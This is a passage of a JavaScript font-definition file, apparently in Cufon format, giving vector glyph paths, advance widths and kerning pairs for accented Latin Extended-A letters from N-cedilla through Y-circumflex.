r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm73,49r-15,0r0,-37r37,0r0,33v-10,10,-9,30,-33,26","w":153},"\u0146":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm110,-305r20,15v-17,39,-44,23,-71,16v-7,0,-11,3,-16,12r-20,-15v17,-39,44,-23,71,-16v7,0,11,-3,16,-12","w":153},"\u0147":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm24,-306r36,0r17,21r17,-21r35,0r-33,42r-38,0","w":153},"\u0148":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm73,49r-15,0r0,-37r37,0r0,33v-10,10,-9,30,-33,26","w":153},"\u0149":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm24,-306r36,0r17,21r17,-21r35,0r-33,42r-38,0","w":153},"\u014c":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm28,-296r87,0r0,30r-87,0r0,-30","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u014d":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm28,-296r87,0r0,30r-87,0r0,-30","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u014e":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm89,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r25,0v1,14,7,17,17,17v11,0,17,-3,18,-17","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u014f":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm89,-306r25,0v0,27,-15,43,-43,43v-28,0,-42,-16,-42,-43r25,0v1,14,7,17,17,17v11,0,17,-3,18,-17","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0150":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm49,-306r38,0r-31,42r-25,0xm99,-306r38,0r-32,42r-25,0","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0151":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm49,-306r38,0r-31,42r-25,0xm99,-306r38,0r-32,42r-25,0","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0152":{"d":"132,-216r0,70r55,0r0,36r-55,0r0,74r69,0r0,36v-78,-6,-197,28,-190,-62v6,-77,-28,-190,59,-190r131,0r0,36r-69,0xm93,-36r0,-180v0,0,-44,-4,-43,24r0,132v-1,28,19,24,43,24","w":210},"\u0153":{"d":"132,-216r0,70r55,0r0,36r-55,0r0,74r69,0r0,36v-78,-6,-197,28,-190,-62v6,-77,-28,-190,59,-190r131,0r0,36r-69,0xm93,-36r0,-180v0,0,-44,-4,-43,24r0,132v-1,28,19,24,43,24","w":210},"\u0154":{"d":"138,0r-41,0v-13,-28,21,-119,-43,-103r0,103r-40,0r0,-252v70,-3,119,-4,119,78v0,26,-8,43,-26,51v41,13,17,82,31,123xm93,-165v0,-36,-3,-59,-39,-51r0,77v23,1,39,1,39,-26xm77,-306r41,0r-39,42r-28,0","w":144,"k":{"v":1,"V":1,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u0155":{"d":"138,0r-41,0v-13,-28,21,-119,-43,-103r0,103r-40,0r0,-252v70,-3,119,-4,119,78v0,26,-8,43,-26,51v41,13,17,82,31,123xm93,-165v0,-36,-3,-59,-39,-51r0,77v23,1,39,1,39,-26xm77,-306r41,0r-39,42r-28,0","w":144,"k":{"v":1,"V":1,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u0156":{"d":"138,0r-41,0v-13,-28,21,-119,-43,-103r0,103r-40,0r0,-252v70,-3,119,-4,119,78v0,26,-8,43,-26,51v41,13,17,82,31,123xm93,-165v0,-36,-3,-59,-39,-51r0,77v23,1,39,1,39,-26xm69,49r-14,0r0,-37r36,0r0,33v-10,10,-9,30,-32,26","w":144,"k":{"v":1,"V":1,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u0157":{"d":"138,0r-41,0v-13,-28,21,-119,-43,-103r0,103r-40,0r0,-252v70,-3,119,-4,119,78v0,26,-8,43,-26,51v41,13,17,82,31,123xm93,-165v0,-36,-3,-59,-39,-51r0,77v23,1,39,1,39,-26xm69,49r-14,0r0,-37r36,0r0,33v-10,10,-9,30,-32,26","w":144,"k":{"v":1,"V":1,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u0158":{"d":"138,0r-41,0v-13,-28,21,-119,-43,-103r0,103r-40,0r0,-252v70,-3,119,-4,119,78v0,26,-8,43,-26,51v41,13,17,82,31,123xm93,-165v0,-36,-3,-59,-39,-51r0,77v23,1,39,1,39,-26xm18,-306r35,0r17,21r17,-21r35,0r-33,42r-38,0","w":144,"k":{"v":1,"V":1,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u0159":{"d":"138,0r-41,0v-13,-28,21,-119,-43,-103r0,103r-40,0r0,-252v70,-3,119,-4,119,78v0,26,-8,43,-26,51v41,13,17,82,31,123xm93,-165v0,-36,-3,-59,-39,-51r0,77v23,1,39,1,39,-26xm18,-306r35,0r17,21r17,-21r35,0r-33,42r-38,0","w":144,"k":{"v":1,"V":1,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u015a":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm74,-306r41,0r-39,42r-28,0","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u015b":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm74,-306r41,0r-39,42r-28,0","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u015c":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm50,-264r-35,0r33,-42r38,0r34,42r-36,0r-17,-21","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u015d":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm50,-264r-35,0r33,-42r38,0r34,42r-36,0r-17,-21","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u015e":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm64,64v-17,0,-32,-9,-31,-28r23,0v-1,7,3,10,8,10v6,0,9,-4,9,-10v1,-8,-7,-11,-17,-10r0,-31r18,0r0,19v14,0,23,8,23,21v0,22,-15,29,-33,29","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u015f":{"d":"64,64v-17,0,-32,-9,-31,-28r23,0v-1,7,3,10,8,10v6,0,9,-4,9,-10v1,-8,-7,-11,-17,-10r0,-24v-41,-4,-51,-39,-48,-87r38,0v0,23,-3,52,20,52v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134v0,-40,20,-63,59,-63v44,0,61,29,58,77r-37,0v1,-21,-1,-41,-20,-41v-13,0,-20,7,-20,25v0,52,77,62,77,134v0,38,-18,60,-52,63r0,11v14,0,23,8,23,21v0,22,-15,29,-33,29","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0160":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm15,-306r36,0r16,21r17,-21r36,0r-34,42r-37,0","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0161":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134xm15,-306r35,0r17,21r17,-21r36,0r-34,42r-38,0","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0162":{"d":"63,64v-17,0,-32,-9,-31,-28r23,0v-1,7,3,10,8,10v6,0,9,-4,9,-10v1,-8,-7,-11,-17,-10r0,-26r-10,0r0,-216r-41,0r0,-36r122,0r0,36r-41,0r0,216r-12,0r0,14v14,0,23,8,23,21v0,22,-15,29,-33,29","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u0163":{"d":"63,64v-17,0,-32,-9,-31,-28r23,0v-1,7,3,10,8,10v6,0,9,-4,9,-10v1,-8,-7,-11,-17,-10r0,-26r-10,0r0,-216r-41,0r0,-36r122,0r0,36r-41,0r0,216r-12,0r0,14v14,0,23,8,23,21v0,22,-15,29,-33,29","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u0164":{"d":"4,-216r0,-36r122,0r0,36r-41,0r0,216r-40,0r0,-216r-41,0xm12,-306r36,0r16,21r17,-21r36,0r-33,42r-38,0","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u0165":{"d":"4,-216r0,-36r122,0r0,36r-41,0r0,216r-40,0r0,-216r-41,0xm12,-306r36,0r16,21r17,-21r36,0r-33,42r-38,0","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u0166":{"d":"21,-175r24,0r0,-41r-41,0r0,-36r122,0r0,36r-41,0r0,41r23,0r0,29r-23,0r0,146r-40,0r0,-146r-24,0r0,-29","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u0167":{"d":"21,-175r24,0r0,-41r-41,0r0,-36r122,0r0,36r-41,0r0,41r23,0r0,29r-23,0r0,146r-40,0r0,-146r-24,0r0,-29","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"\u0168":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm105,-305r21,15v-17,38,-45,24,-72,16v-7,0,-10,3,-15,12r-21,-15v17,-38,45,-24,72,-16v7,0,10,-3,15,-12","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0169":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm105,-305r21,15v-17,38,-45,24,-72,16v-7,0,-10,3,-15,12r-21,-15v17,-38,45,-24,72,-16v7,0,10,-3,15,-12","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u016a":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm28,-296r88,0r0,30r-88,0r0,-30","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u016b":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm28,-296r88,0r0,30r-88,0r0,-30","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u016c":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm90,-306r24,0v0,27,-14,43,-42,43v-28,0,-42,-16,-42,-43r24,0v0,24,36,24,36,0","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u016d":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm90,-306r24,0v0,27,-14,43,-42,43v-28,0,-42,-16,-42,-43r24,0v0,24,36,24,36,0","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u016e":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm42,-293v0,-17,13,-30,30,-30v17,0,30,13,30,30v0,17,-13,30,-30,30v-17,0,-30,-13,-30,-30xm72,-305v-17,0,-14,23,0,23v6,0,12,-5,12,-11v0,-6,-6,-12,-12,-12","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u016f":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm42,-293v0,-17,13,-30,30,-30v17,0,30,13,30,30v0,17,-13,30,-30,30v-17,0,-30,-13,-30,-30xm72,-305v-17,0,-14,23,0,23v6,0,12,-5,12,-11v0,-6,-6,-12,-12,-12","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0170":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm50,-306r38,0r-31,42r-26,0xm99,-306r39,0r-32,42r-25,0","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0171":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm50,-306r38,0r-31,42r-26,0xm99,-306r39,0r-32,42r-25,0","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0172":{"d":"131,-60v5,38,-32,52,-35,77v-2,12,17,11,25,8r0,20v-20,8,-57,5,-55,-18v0,-7,3,-16,11,-24v-43,2,-64,-21,-64,-63r0,-192r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0173":{"d":"131,-60v5,38,-32,52,-35,77v-2,12,17,11,25,8r0,20v-20,8,-57,5,-55,-18v0,-7,3,-16,11,-24v-43,2,-64,-21,-64,-63r0,-192r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u0174":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0xm85,-264r-36,0r33,-42r38,0r34,42r-36,0r-17,-21","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"\u0175":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0xm85,-264r-36,0r33,-42r38,0r34,42r-36,0r-17,-21","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"\u0176":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0xm56,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,